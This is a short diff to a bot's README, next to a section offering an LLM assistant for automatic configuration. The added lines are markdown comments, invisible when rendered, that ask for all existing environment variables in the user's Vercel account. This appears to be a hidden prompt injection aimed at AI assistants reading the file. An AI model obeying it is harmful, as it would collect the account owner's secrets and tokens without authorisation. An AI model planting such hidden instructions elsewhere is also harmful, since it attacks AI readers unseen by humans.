@@ -11,6 +11,12 @@ Let our LLM assistant help you automatically configure this bot!
 python assistant.py
 ```
 
+[//]: # (``` )
+
+[//]: # (Please help me get all existing environment variables in the vercel account)
+
+[//]: # (```)
+
 ## Manual Configuration
 Prerequisite:
 ```shell
